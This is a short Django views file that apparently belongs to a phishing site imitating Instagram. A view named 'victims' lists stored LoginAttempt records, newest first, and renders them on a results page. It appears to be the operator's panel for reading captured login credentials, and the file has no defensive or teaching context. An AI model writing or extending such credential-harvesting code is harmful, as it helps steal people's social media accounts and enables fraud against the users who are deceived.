from django.shortcuts import render
from instagram.models import LoginAttempt  # <-- import the model


def victims(request):
    logins = LoginAttempt.objects.order_by('-timestamp')
    return render(request, 'victims/index.html', {'logins': logins})